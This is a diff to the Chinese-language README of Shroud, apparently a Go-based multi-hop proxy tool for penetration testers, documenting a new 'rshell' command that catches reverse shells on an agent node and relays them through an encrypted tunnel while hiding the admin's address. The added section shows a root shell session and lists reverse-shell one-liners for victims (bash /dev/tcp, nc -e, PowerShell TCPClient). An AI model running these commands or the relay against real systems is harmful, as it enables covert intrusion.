@@ -192,6 +192,7 @@ Shroud是一个利用go语言编写、专为渗透测试工作者制作的多级
 - Script模式保活(`--script`)：stdin命令执行完毕后进程保持运行，不再退出
 - Agent主动心跳(自动)：Agent每30s+随机抖动主动发送HEARTBEAT探测连接存活，断线自动触发重连
 - 强制重注册(`--force-reenroll`)：Agent端清除旧身份重新注册，配合`SHROUD_ALLOW_REENROLL`环境变量
+- 反弹Shell监听(`rshell <端口>`)：命令Agent监听指定端口，捕获反弹Shell并通过加密隧道转发至Admin交互，不暴露Admin地址
 
 **加密与认证**
 
@@ -1146,6 +1147,8 @@ Node[1]'s children ->
   newcircuit                                      Request a new Tor circuit for current node
   revoke                                          Revoke current node's certificate and disconnect
   shutdown                                        Terminate current node
+  rshell     <port>                               Listen on agent port for reverse shell, interact via tunnel
+  stoprshell                                      Stop reverse shell listener on agent
   back                                            Back to parent panel
   exit                                            Exit Shroud 
 ```
@@ -1496,6 +1499,48 @@ $
 (node 1) >> shutdown
 (node 1) >>
 [*] Node 1 is offline!
+```
+
+- `rshell`: 命令当前节点监听指定端口，等待反弹Shell连入并通过隧道交互
+
+```
+(node 0) >> rshell 4444
+[*] Asking agent to listen on port 4444......
+[*] Agent is listening on port 4444, waiting for reverse shell...
+[*] (terminal paused until shell connects, Ctrl+C won't work here)
+
+[*] Reverse shell connection received!
+
+whoami
+root
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+受害者执行反弹Shell命令即可被捕获：
+
+```bash
+# Linux
+bash -i >& /dev/tcp/<agent_ip>/4444 0>&1
+
+# 或使用 nc
+nc -e /bin/sh <agent_ip> 4444
+
+# Windows
+powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('<agent_ip>',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){...}"
+```
+
+> **注意：**
+> - 监听端口在Agent端，Admin地址不暴露
+> - 执行`rshell`后终端暂停，直到反弹Shell连入
+> - 交互模式下按`Ctrl+C`+`Enter`退出交互，返回节点面板
+> - Agent端同时只能有一个rshell监听器
+
+- `stoprshell`: 停止当前节点的反弹Shell监听
+
+```
+(node 0) >> stoprshell
+[*] Reverse shell listener stopped
 ```
 
 - `back`: 退回到主panel
